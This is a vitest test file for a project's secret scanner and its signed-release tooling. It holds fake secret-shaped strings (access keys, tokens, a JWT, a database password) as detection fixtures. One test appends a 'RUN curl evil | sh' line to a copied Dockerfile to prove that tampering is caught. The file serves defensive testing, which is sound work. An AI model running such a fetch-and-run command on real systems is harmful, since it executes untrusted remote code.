import { execFileSync } from "node:child_process";
import { cpSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
// @ts-expect-error plain JavaScript modules
import { RULES, scanRepo, scanText } from "../scripts/scan-secrets.mjs";
// @ts-expect-error plain JavaScript module
import { buildManifest, checkFiles, imageRefs, keygen, signManifest, verifyManifest } from "../scripts/release-lib.mjs";

const root = new URL("..", import.meta.url).pathname;
const node = (script: string, ...a: string[]) => execFileSync("node", [join(root, script), ...a], { encoding: "utf8", cwd: root, stdio: ["ignore", "pipe", "pipe"] });

describe("secret scanning", () => {
  const bad: [string, string][] = [
    ["private key", "-----BEGIN OPENSSH PRIVATE KEY-----"], ["AWS access key", "key = AKIAABCDEFGHIJKLMNOP"],
    ["GitHub token", "token ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"], ["API key (sk-)", "sk-ant-" + "api03-abcdefghijklmnopqrstuvwxyz012345"],
    ["connection string with a password", "DATABASE_URL=postgres://app:R3al-Passw0rd-9x@db.internal:5432/x"], ["secret assigned a long random value", "METRICS_TOKEN = 'k3J9sLq0Zx81mNbVcXzA7sdFgH2jK5l'"],
    ["JSON web token", "eyJhbGciOiJSUzI1NiJ9abcdef.eyJzdWIiOiJ1c2VyMTIzNDU2Nzg5MCJ9.c2lnbmF0dXJlLXNpZ25hdHVyZQ"],
  ];
  it.each(bad)("finds a %s", (rule, line) => { expect(scanText(line).map((f: { rule: string }) => f.rule)).toContain(rule); });
  it("does not flag placeholders, file references, or ordinary prose", () => {
    for (const ok of ["postgres://tigeris_app:CHANGE_ME@localhost:5432/tigeris", "postgres://u:$DB_PASSWORD@h/d", "DATABASE_URL_FILE: /run/secrets/db_app_url", "TIGERIS_DOCUMENT_KEY_FILE=/run/secrets/document_key", "the password must be at least 12 characters", "METRICS_TOKEN: ${METRICS_TOKEN:?set}", "const token = req.headers.authorization"])
      expect(scanText(ok), ok).toEqual([]);
  });
  it("lets a named test value through, and only in its own file", () => {
    expect(scanText("postgres://u:a-long-strong-pass@h/d", ["a-long-strong-pass"])).toEqual([]);
    expect(RULES.length).toBeGreaterThan(8);
  });
  it("passes on this repository, so a commit that adds a secret is stopped by pnpm check", () => { expect(scanRepo({ root })).toEqual([]); });
});

describe("signed releases", () => {
  it("pins every base image by digest", () => {
    const refs = imageRefs(root);
    expect(refs.length).toBeGreaterThanOrEqual(5);
    expect(refs.filter((r: { pinned: boolean }) => !r.pinned)).toEqual([]);
  });
  it("signs a manifest, verifies it, and notices a changed manifest, key or file", () => {
    const k = keygen(), other = keygen();
    const m = buildManifest({ root, version: "1.2.3", commit: "a".repeat(40), now: new Date("2030-01-01T00:00:00Z"), builtImages: { app: "sha256:" + "b".repeat(64) } });
    expect(Object.keys(m.files)).toEqual(expect.arrayContaining(["pnpm-lock.yaml", "Dockerfile", "deploy/compose/docker-compose.yml"])); expect(m.migrations.count).toBeGreaterThanOrEqual(21);
    const sig = signManifest(m, k.privatePem);
    expect(verifyManifest(m, sig, k.publicPem)).toBe(true);
    expect(verifyManifest({ ...m, commit: "c".repeat(40) }, sig, k.publicPem)).toBe(false);
    expect(verifyManifest({ ...m, builtImages: { app: "sha256:" + "d".repeat(64) } }, sig, k.publicPem)).toBe(false);
    expect(verifyManifest(m, sig, other.publicPem)).toBe(false);
    expect(verifyManifest(m, "not a signature", k.publicPem)).toBe(false);
    expect(checkFiles(m, root)).toMatchObject({ problems: [] });
    const copy = mkdtempSync(join(tmpdir(), "tigeris-rel-")); cpSync(join(root, "Dockerfile"), join(copy, "Dockerfile")); writeFileSync(join(copy, "Dockerfile"), readFileSync(join(root, "Dockerfile"), "utf8") + "\nRUN curl evil | sh\n");
    expect(checkFiles(m, copy).problems).toEqual(["Dockerfile does not match the manifest"]);
  });
  it("makes and checks a release from the command line, and refuses a dirty tree or an unpinned image", () => {
    const dir = mkdtempSync(join(tmpdir(), "tigeris-rel-")), keys = join(dir, "keys");
    node("scripts/release.mjs", "keygen", "--out", keys);
    const out = join(dir, "out");
    node("scripts/release.mjs", "--key", join(keys, "release-signing.key"), "--out", out, "--allow-dirty", "--image", "app=sha256:" + "e".repeat(64));
    const v = node("scripts/verify-release.mjs", "--public-key", join(keys, "release-signing.pub"), "--manifest", join(out, "release-manifest.json"), "--root", root);
    expect(v).toMatch(/Signature valid/); expect(v).toMatch(/Image app: sha256:e{64}/); expect(v).toMatch(/Listed files match/);
    const m = JSON.parse(readFileSync(join(out, "release-manifest.json"), "utf8")); m.commit = "f".repeat(40); writeFileSync(join(out, "release-manifest.json"), JSON.stringify(m));
    expect(() => node("scripts/verify-release.mjs", "--public-key", join(keys, "release-signing.pub"), "--manifest", join(out, "release-manifest.json"))).toThrow(/NOT VERIFIED/);
    expect(() => node("scripts/release.mjs", "--key", join(keys, "release-signing.key"), "--out", join(dir, "o2"), "--allow-dirty", "--image", "app=latest")).toThrow(/expected name=sha256/);
  });
});
